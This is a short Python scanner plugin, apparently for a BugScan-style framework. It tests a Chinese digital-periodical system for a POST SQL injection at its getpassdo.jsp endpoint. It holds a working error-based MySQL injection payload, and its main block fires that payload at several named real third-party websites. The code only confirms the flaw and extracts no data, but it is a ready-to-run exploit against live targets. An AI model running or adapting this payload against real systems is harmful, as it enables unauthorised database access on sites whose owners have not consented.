#!/usr/bin/env python
# -*- coding: utf-8 -*-

#   Author     = 奶权
#   PlugName   = 北京紫新报通数字期刊系统一处通用POST注入
#   Refer      = http://www.wooyun.org/bugs/wooyun-2010-0138987
def assign(service, arg):
    if service == 'uniflows':
        return True, arg
def audit(arg):
    payload = 'epaper/web/getpassdo.jsp'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target, post="username=1\' AND (SELECT 9946 FROM(SELECT COUNT(*),CONCAT(0x7E,(MID((IFNULL(CAST(MD5(1) AS CHAR),0x20)),1,54)),0x5E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'Pqja\'=\'Pqja")
    if code == 500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole("POST Injection: "+target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('uniflows', 'http://114.113.148.102/')[1])
    audit(assign('uniflows', 'http://szb.zgqy.zj.cn/')[1])
    #audit(assign('uniflows', 'http://epaper.xinjiangnet.com.cn/')[1])  #未通过
    audit(assign('uniflows', 'http://epaper.cmt.com.cn/')[1])